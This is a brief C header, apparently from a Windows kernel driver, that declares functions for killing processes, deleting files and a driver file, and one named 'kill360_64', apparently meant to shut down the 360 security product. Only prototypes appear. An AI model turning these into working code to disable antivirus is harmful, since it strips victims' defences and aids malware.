#pragma once
#include "internal.h"
CHAR xKill1(DWORD32 dwPid);
CHAR xKill2(DWORD32 dwPid);
CHAR xDel1(PCSTR userPath);

NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath);
NTSTATUS kill360_64();
NTSTATUS xDelFile3(PCHAR pAsFileName);